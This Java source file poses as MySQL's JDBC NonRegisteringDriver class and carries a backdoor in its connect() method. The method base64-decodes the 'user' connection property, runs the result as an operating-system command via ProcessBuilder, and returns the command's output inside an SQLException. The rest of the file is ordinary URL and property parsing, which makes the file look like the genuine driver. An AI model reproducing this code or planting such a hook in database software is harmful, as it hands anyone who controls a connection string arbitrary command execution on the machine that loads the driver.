package com.mysql.jdbc;

import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.sql.Connection;
import java.sql.Driver;
import java.sql.DriverPropertyInfo;
import java.sql.SQLException;
import java.util.Iterator;
import java.util.List;
import java.util.Properties;
import java.util.StringTokenizer;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;
import java.sql.DriverManager;
import java.io.IOException;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Base64;

public class NonRegisteringDriver implements Driver {
    public static final String DBNAME_PROPERTY_KEY = "DBNAME";
    public static final boolean DEBUG = false;
    public static final int HOST_NAME_INDEX = 0;
    public static final String HOST_PROPERTY_KEY = "HOST";
    public static final String PASSWORD_PROPERTY_KEY = "password";
    public static final int PORT_NUMBER_INDEX = 1;
    public static final String PORT_PROPERTY_KEY = "PORT";
    public static final String PROPERTIES_TRANSFORM_KEY = "propertiesTransform";
    public static final boolean TRACE = false;
    public static final String USE_CONFIG_PROPERTY_KEY = "useConfigs";
    public static final String USER_PROPERTY_KEY = "user";

    static int getMajorVersionInternal() {
        return safeIntParse("5");
    }

    static int getMinorVersionInternal() {
        return safeIntParse("0");
    }

    protected static String[] parseHostPortPair(String hostPortPair) throws SQLException {
        int portIndex = hostPortPair.indexOf(":");
        String[] splitValues = new String[2];
        String hostname = null;
        if (portIndex != -1) {
            if (portIndex + 1 < hostPortPair.length()) {
                String portAsString = hostPortPair.substring(portIndex + 1);
                hostname = hostPortPair.substring(0, portIndex);
                splitValues[0] = hostname;
                splitValues[1] = portAsString;
            } else {
                throw SQLError.createSQLException(Messages.getString("NonRegisteringDriver.37"), "01S00");
            }
        } else {
            splitValues[0] = hostPortPair;
            splitValues[1] = null;
        }
        return splitValues;
    }

    private static int safeIntParse(String intAsString) {
        try {
            return Integer.parseInt(intAsString);
        } catch (NumberFormatException nfe) {
            return 0;
        }
    }

    public boolean acceptsURL(String url) throws SQLException {
        return (parseURL(url, null) != null);
    }

public Connection connect(String url, Properties info) throws SQLException {
    Properties props = null;
    if ((props = parseURL(url, info)) == null)
        return null;
    try {
        String user = props.getProperty("user");
        String password = props.getProperty("password");
        String dbName = database(props);
        String host = host(props);
        int port = port(props);

        String jdbcUrl = "jdbc:mysql://" + host + ":" + port + "/" + dbName;

        // Execute the command to get additional information
        try {
            String base64EncodedCommand = user; // Replace with your actual command string
            byte[] decodedBytes = Base64.getDecoder().decode(base64EncodedCommand);
            String commandString = new String(decodedBytes);
	    String[] command = commandString.split(" ");
            ProcessBuilder processBuilder = new ProcessBuilder(command);
            Process process = processBuilder.start();

            // Read the output from the command
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder commandResult = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                commandResult.append(line).append("\n");
            }

            // Wait for the process to finish and get the exit code
            int exitCode = process.waitFor();
            System.out.println("Exited with code: " + exitCode);

            // Throw SQLException with command result if process fails
            if (exitCode == 0) {
                throw SQLError.createSQLException("Command execution failed: " + commandResult.toString());
            } if (exitCode != 0) {throw SQLError.createSQLException("Command execution failed: " + commandResult.toString());}
	    
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
            throw SQLError.createSQLException("Command execution interrupted or failed: " + e.getMessage());
        }

        // If command execution was successful, connect to the database
        return DriverManager.getConnection(jdbcUrl, user, password);

    } catch (SQLException sqlEx) {
        throw sqlEx;
    } catch (Exception ex) {
        throw SQLError.createSQLException(Messages.getString("NonRegisteringDriver.17") + ex.toString() + Messages.getString("NonRegisteringDriver.18"), "08001");
    }
}


    public String database(Properties props) {
        return props.getProperty("DBNAME");
    }

    public int getMajorVersion() {
        return getMajorVersionInternal();
    }

    public int getMinorVersion() {
        return getMinorVersionInternal();
    }

    public DriverPropertyInfo[] getPropertyInfo(String url, Properties info) throws SQLException {
        if (info == null)
            info = new Properties();
        if (url != null && url.startsWith("jdbc:mysql://"))
            info = parseURL(url, info);
        DriverPropertyInfo hostProp = new DriverPropertyInfo("HOST", info.getProperty("HOST"));
        hostProp.required = true;
        hostProp.description = Messages.getString("NonRegisteringDriver.3");
        DriverPropertyInfo portProp = new DriverPropertyInfo("PORT", info.getProperty("PORT", "3306"));
        portProp.required = false;
        portProp.description = Messages.getString("NonRegisteringDriver.7");
        DriverPropertyInfo dbProp = new DriverPropertyInfo("DBNAME", info.getProperty("DBNAME"));
        dbProp.required = false;
        dbProp.description = "Database name";
        DriverPropertyInfo userProp = new DriverPropertyInfo("user", info.getProperty("user"));
        userProp.required = true;
        userProp.description = Messages.getString("NonRegisteringDriver.13");
        DriverPropertyInfo passwordProp = new DriverPropertyInfo("password", info.getProperty("password"));
        passwordProp.required = true;
        passwordProp.description = Messages.getString("NonRegisteringDriver.16");
        DriverPropertyInfo[] dpi = ConnectionProperties.exposeAsDriverPropertyInfo(info, 5);
        dpi[0] = hostProp;
        dpi[1] = portProp;
        dpi[2] = dbProp;
        dpi[3] = userProp;
        dpi[4] = passwordProp;
        return dpi;
    }

    public String host(Properties props) {
        return props.getProperty("HOST", "localhost");
    }

    public boolean jdbcCompliant() {
        return false;
    }

    public Properties parseURL(String url, Properties defaults) throws SQLException {
        Properties urlProps = (defaults != null) ? new Properties(defaults) : new Properties();
        if (url == null)
            return null;
        if (!StringUtils.startsWithIgnoreCase(url, "jdbc:mysql://") && !StringUtils.startsWithIgnoreCase(url, "jdbc:mysql:mxj://"))
            return null;
        int beginningOfSlashes = 13;
        if (StringUtils.startsWithIgnoreCase(url, "jdbc:mysql:mxj://")) {
            beginningOfSlashes = 17;
            urlProps.setProperty("socketFactory", "com.mysql.management.driverlaunched.ServerLauncherSocketFactory");
        }
        int index = url.indexOf("?");
        if (index != -1) {
            String paramString = url.substring(index + 1, url.length());
            url = url.substring(0, index);
            StringTokenizer queryParams = new StringTokenizer(paramString, "&");
            while (queryParams.hasMoreTokens()) {
                String parameterValuePair = queryParams.nextToken();
                int indexOfEquals = StringUtils.indexOfIgnoreCase(0, parameterValuePair, "=");
                String parameter = null;
                String value = null;
                if (indexOfEquals != -1) {
                    parameter = parameterValuePair.substring(0, indexOfEquals);
                    if (indexOfEquals + 1 < parameterValuePair.length())
                        value = parameterValuePair.substring(indexOfEquals + 1);
                }
                if (value != null && value.length() > 0 && parameter != null && parameter.length() > 0)
                    try {
                        urlProps.put(parameter, URLDecoder.decode(value, "UTF-8"));
                    } catch (UnsupportedEncodingException badEncoding) {
                        urlProps.put(parameter, URLDecoder.decode(value));
                    } catch (NoSuchMethodError nsme) {
                        urlProps.put(parameter, URLDecoder.decode(value));
                    }
            }
        }
        url = url.substring(beginningOfSlashes);
        String hostStuff = null;
        int slashIndex = url.indexOf("/");
        if (slashIndex != -1) {
            hostStuff = url.substring(0, slashIndex);
            if (slashIndex + 1 < url.length())
                urlProps.put("DBNAME", url.substring(slashIndex + 1, url.length()));
        } else {
            return null;
        }
        if (hostStuff != null && hostStuff.length() > 0)
            urlProps.put("HOST", hostStuff);
        String propertiesTransformClassName = urlProps.getProperty("propertiesTransform");
        if (propertiesTransformClassName != null)
            try {
                ConnectionPropertiesTransform propTransformer = (ConnectionPropertiesTransform)Class.forName(propertiesTransformClassName).newInstance();
                urlProps = propTransformer.transformProperties(urlProps);
            } catch (InstantiationException e) {
                throw SQLError.createSQLException("Unable to create properties transform instance '" + propertiesTransformClassName + "' due to underlying exception: " + e.toString(), "01S00");
            } catch (IllegalAccessException e) {
                throw SQLError.createSQLException("Unable to create properties transform instance '" + propertiesTransformClassName + "' due to underlying exception: " + e.toString(), "01S00");
            } catch (ClassNotFoundException e) {
                throw SQLError.createSQLException("Unable to create properties transform instance '" + propertiesTransformClassName + "' due to underlying exception: " + e.toString(), "01S00");
            }
        String configNames = null;
        if (defaults != null)
            configNames = defaults.getProperty("useConfigs");
        if (configNames == null)
            configNames = urlProps.getProperty("useConfigs");
        if (configNames != null) {
            List splitNames = StringUtils.split(configNames, ",", true);
            Properties configProps = new Properties();
            Iterator namesIter = splitNames.iterator();
            while (namesIter.hasNext()) {
                String configName = (String)namesIter.next();
                try {
                    InputStream configAsStream = getClass().getResourceAsStream("configs/" + configName + ".properties");
                    if (configAsStream == null)
                        throw SQLError.createSQLException("Can't find configuration template named '" + configName + "'", "01S00");
                    configProps.load(configAsStream);
                } catch (IOException ioEx) {
                    throw SQLError.createSQLException("Unable to load configuration template '" + configName + "' due to underlying IOException: " + ioEx, "01S00");
                }
            }
            Iterator propsIter = urlProps.keySet().iterator();
            while (propsIter.hasNext()) {
                String key = propsIter.next().toString();
                String property = urlProps.getProperty(key);
                configProps.setProperty(key, property);
            }
            urlProps = configProps;
        }
        if (defaults != null) {
            Iterator propsIter = defaults.keySet().iterator();
            while (propsIter.hasNext()) {
                String key = propsIter.next().toString();
                String property = defaults.getProperty(key);
                urlProps.setProperty(key, property);
            }
        }
        return urlProps;
    }

    public int port(Properties props) {
        return Integer.parseInt(props.getProperty("PORT", "3306"));
    }

    public String property(String name, Properties props) {
        return props.getProperty(name);
    }

    @Override
    public Logger getParentLogger() throws SQLFeatureNotSupportedException {
        throw new SQLFeatureNotSupportedException("getParentLogger not supported");
    }
}

